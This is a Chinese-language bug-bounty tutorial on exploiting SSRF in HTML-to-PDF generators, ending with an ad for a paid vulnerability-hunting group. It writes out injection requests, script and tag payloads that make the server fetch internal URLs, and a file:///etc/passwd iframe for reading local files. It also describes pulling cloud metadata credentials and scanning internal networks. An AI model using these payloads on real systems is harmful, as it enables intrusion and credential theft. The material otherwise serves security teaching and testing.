#  PDF 生成器漏洞利用：查找 PDF 生成器中 SSRF 漏洞的完整指南   
 Z2O安全攻防   2025-05-22 16:01  
  
PDF 生成器在应用程序中很常见。开发人员倾向于使用这些组件来根据数据库提供的动态数据生成文档。然而，并非所有开发人员都意识到集成此功能可能带来的潜在风险。  
  
在本文中，我们将深入探讨在 PDF 生成器中处理未经清理的用户可控输入的含义，以及如何利用这些特性并升级我们的初步发现以产生更大的影响。  
  
让我们开始吧！  
## 什么是 PDF 生成器  
  
PDF 生成器是 Web 应用程序中的一个组件，允许基于从参数、数据库内容或其他数据源检索的动态数据创建 PDF 文档。PDF 生成器用途广泛，从收据和发票生成到报告和证书签发，应有尽有。  
  
开发人员经常使用流行的（开源）库和第三方服务来生成动态 PDF 文档。这些库利用多种方法来生成动态 PDF 文档。  
  
让我们来探讨一下您的目标可能为您生成 PDF 导出的 3 种常见方法。  
### HTML 转 PDF（最常用的方法）  
  
此过程通常涉及部署无头 Web 浏览器（例如 Chromium），使用动态数据渲染 HTML 模板，并调用浏览器 API 生成 PDF 文档。整个文档生成过程通常在服务器端进行，因为创建 PDF 文件导出需要时间。  
  
如果用户可控制的输入直接连接到 HTML 模板，而没有经过适当的清理，则可能容易受到 HTML 注入的影响，在大多数情况下，这种攻击可能会进一步升级为服务器端请求伪造 (SSRF)、本地文件泄露 (LFD) 和其他漏洞类型。  
### 基于模板的生成  
  
一些库依赖于特定模板语言定义的预结构模板。在最终文档渲染和导出之前，动态数据会映射到模板字段。  
  
与前一种方法一样，如果将用户可控制的输入直接连接到模板，则可能容易受到注入攻击，从而导致各种漏洞，从简单的内容注入到代码注入和远程代码执行。  
  
**提示！****CVE-2023-33733****是一个完美的例子，展示了如何将注入问题升级为代码注入漏洞！**  
### 第三方服务  
  
一些应用程序会使用外部服务。此过程通常依赖于将动态数据发送到第三方 API，并在 API 响应中接收 PDF 文件。提供托管 PDF 生成的第三方服务通常不易受到注入攻击。  
  
这种方法不太常用，因为这种方法并不总能保证隐私，尤其是在发送敏感数据（例如发票和收据）时。  
  
在本文中，我们将主要介绍第一种也是最常见的 PDF 生成方法。  
## 识别 PDF 生成器  
  
PDF 生成器通常用于 Web 应用程序中生成动态文档，例如：  
- 报告（例如，分析报告或任何其他类型的报告）  
  
- 收据和发票（尤其是电子商务目标）  
  
- 帐户档案  
  
- 银行账户对账单  
  
- 证书（在教育培训平台更为普遍）  
  
![Example of PDF generation feature](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tvVtWSjvp1xtnTfesfProCZ98JDmMyH2ySaOJnJTO4xicI7lSSkJYSzg/640?wx_fmt=png&from=appmsg "")  
  
PDF 生成功能示例  
  
现在让我们详细了解如何利用 PDF 生成器来实现服务器端请求伪造，并进一步升级我们的初步发现！  
## 利用 PDF 生成器中的 SSRF 漏洞  
  
PDF 生成可能需要一些时间，因此通常以异步方式（稍后会详细介绍）在服务器端进行。当用户可控制的数据以不安全的方式处理并直接连接到 HTML 模板时，就有可能注入 HTML 或任意 JavaScript 代码。  
  
让我们看几个例子。  
### 充分利用 SSRF 漏洞  
  
看一下下面的代码片段：  
  
![Vulnerable code snippet](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tic5mXshQy0PgRhD3BrjhqUfKWWoeh5JPFHw5121qfiaKppM3sgrW7icHg/640?wx_fmt=png&from=appmsg "")  
  
易受攻击的代码片段  
  
API 端点接收**invoiceData**  
主体参数，并渲染用户可控制的 HTML，而无需进行任何适当的过滤。这意味着我们可以渲染任意 HTML 标签（包括脚本标签），从而允许 JavaScript 在服务器端执行。  
  
利用这些信息，我们可以构造一个payload，代表目标服务器渲染任何资源的响应。例如，发送以下请求，我们就能检索到包含渲染响应的PDF文件：  
```
POST /api/invoice/export HTTP/2Host: app.example.comContent-Type: application/jsonContent-Length: 106{    "invoiceData": "<iframe src=\"https://example.com/\"></iframe>"}
```  
  
![Example of a rendered PDF file](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tz425dJkTh78Dicplez6Dr1YPGAZdrFxD4u0xLq3fo5MnRbWywC9ibjcQ/640?wx_fmt=png&from=appmsg "")  
  
渲染的 PDF 文件示例  
  
遗憾的是，iframe 标签并非在所有情况下都有效。一些目标已经部署了针对 XSS 等注入攻击的主动措施。如果您的脚本标签被拦截，请尝试使用以下有效载荷之一，代表您的目标请求外部内容：  
```
<!-- Using XHR --><script>var x=new XMLHttpRequest();x.onload=(()=>document.write(this.responseText));x.open('GET','http://127.0.0.1');x.send();</script><!-- Using Fetch --><script>fetch('http://127.0.0.1').then(async r=>document.write(await r.text()))</script><!-- Using embed --><embed src="http://127.0.0.1" />
```  
### 利用盲 SSRF 漏洞  
  
在某些情况下，由于激进的 XSS 过滤器，完整的 SSRF 攻击无法实现。在这种情况下，我们仍然可以通过注入盲 XSS Payload 来尝试代表服务器请求外部资源：  
```
<!-- Using base HTML tag --><base href="http://127.0.0.1" /><!-- Loading external stylesheet/script --><link rel="stylesheet" src="http://127.0.0.1" /><script src="http://127.0.0.1"></script><!-- Meta-tag to auto-refresh page --><meta http-equiv="refresh" content="0; url=http://127.0.0.1/" /><!-- Loading external image --><img src="http://127.0.0.1" /><!-- Loading external SVG --><svg src="http://127.0.0.1" /><!-- Useful to bypass blacklists --><input type="image" src="http://127.0.0.1" /><video src="http://127.0.0.1" /><audio src="http://127.0.0.1" /><audio><source src="http://127.0.0.1"/></audio>
```  
  
这些标签在呈现时将强制无头 Web 浏览器请求外部资源，您可以将每个资源的 URL 指向您的私有 OAST 服务器以监控传入的 DNS 和 HTTP 回调。  
  
现在我们已经介绍了利用 PDF 生成器的基础知识，让我们更深入地研究特定环境中的升级技术，以进一步增加我们最初发现的影响！  
## PDF 生成器中不断升级的 SSRF 漏洞  
### 读取本地文件（LFD）  
  
大多数 HTML 转 PDF 生成器都部署了无头 Web 浏览器，这些浏览器以提升的权限运行并可以访问本地文件。这使我们能够读取目标服务器上的本地文件。  
  
以下有效载荷将指示易受攻击的 PDF 生成器在 PDF 导出中包含本地文件的内容：  
```
<!-- Increase the height and width to include the full file contents --><iframe src="file:///etc/passwd" height="1000px" width="1000px"></iframe>
```  
  
一些库提供了内置的安全功能来禁用本地文件访问，例如带有--disable-local-file-access  
选项标志的 wkhtmltopdf。如果启用此选项，我们仍然可以尝试通过针对内部服务来升级我们最初的 SSRF 漏洞。  
### 云环境中的 SSRF  
  
PDF 生成需要时间，因此大多数开发人员都在寻求异步解决方案。当新的导出请求发出时，后端会创建一个新的 PDF 生成作业来处理。PDF 导出完成后，用户会收到一条包含文件链接的通知。  
  
为了实现这一点，一些目标将利用无服务器计算资源（例如 AWS Lambda 或 GCP Cloud Run Functions）。AWS等服务会公开元数据端点，包括身份验证凭证。  
  
我们可以升级我们的初步发现，从元数据端点获取凭据，并进一步扩展我们在目标内的访问权限。  
  
![Example of a leaked AWS Metadata Endpoint](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2t9zoy7R5nsWRREnTVozictbmnmtEs3rfq91rmPXDCbQ0gicg1U2BRkUxg/640?wx_fmt=png&from=appmsg "")  
  
泄露的 AWS 元数据端点示例  
### PDF 生成器中的盲 SSRF  
  
如果由于激进的过滤器、Web 应用程序防火墙 (WAF) 或其他严格验证而导致之前所有读取外部请求响应的尝试都失败，我们仍然可以尝试进一步升级我们的盲 SSRF 漏洞。  
  
有几种方法可以做到这一点，但我们必须首先确保能够在响应中找到指示有效载荷已成功的指标。对于 PDF 生成器，这通常是响应时间。HTTP 响应或 HTTP 状态代码也可能发生变化，但这种情况不太常见，因为大多数应用程序会抑制详细的错误消息。  
  
一旦我们弄清楚了可以帮助我们区分有效和无效请求的响应元素或指标，我们将能够扫描和枚举内部端口和整个网络（包括内部主机名和私有 IP）。  
  
阅读我们关于利用 SSRF 漏洞的详细文章，以获得更深入的解释，了解如何利用盲服务器端请求伪造漏洞扩展目标内的初始访问权限。  
## 结论  
  
PDF 生成器通常在 Web 应用程序中实现。然而，缺少验证以及使用配置错误的包或库所带来的安全隐患，往往会引发高危漏洞。在本文中，我们介绍了几种利用 PDF 生成器漏洞的方法。  
  
建立了一个  
src专项圈子  
，内容包含**src漏洞知识库**  
、**src挖掘技巧**  
、**src视频教程**  
等，一起学习赚赏金技巧，以及专属微信群一起挖洞  
  
圈子专注于更新src相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、分享src优质视频课程
3、分享src挖掘技巧tips
4、小群一起挖洞
```  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg41LkR0ezBlmjJY4Lwgg8mr1A5efwqe0yGE9KTQwLPJTe9zyv3wgYnhA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOXg868PqXyjsACp9LhuEeyfB2kTZVOt5Pz48txg7ueRUvDdeefTNKdg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZDDDv3NsbJDuSicLzBbwVDCPFgbmiaJ4ibf4LRgafQDdYodOgakdpbU1H6XfFQCL81VTudGBv2WniaDA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "null")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKubbDrNbLxaMgsxYrLRrtIiaN4CdiaaENAnUTYUgSyBGenrOOwa7Jcc0k6OvXmcriaw6bvL7n6nOkMmlA/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
图片  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4Bd1oBmTkA5xlNwZM5fLghYeibMBttWrf57h8sU7xDyTe5udCNicuHo8w/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrUoo5XZpxN9Inq87ic71D6aUeMdaWrKXgYYia2On8nMA7bqWDySa8odAq1a0kkp3WFgf0Zp0Eut0A/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4KKlic4yiafWTpLdejicQe3MllEQc24ypeI3anaK7IjJDVyq1WVQN2yKBA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
图片  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOHgjJxnq1ibibJgVUx3LwCjZj62vygx8w6rxia1icmIWiax2YlP6S6LmlmlQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOApVm8H605qOibxia5DqPHfbWD6lmcweDjGv4DLl45waD068ugw2Iv2vg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOwldaSATYOh1WQpk1qz15rLxehOAn4aK7tdbSyNEuHDZpIISCtl6Q8w/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4jFsKRMMNDKbsAZhscCiagnyJScMVmFUqMtae5omlLRdu095mywWszjQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
图片  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4uGJ2SA5BhZ3UyibZvVmcP3sozQEOfVr0jftWpC3YkpDiaAicS1ib3EgXHA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
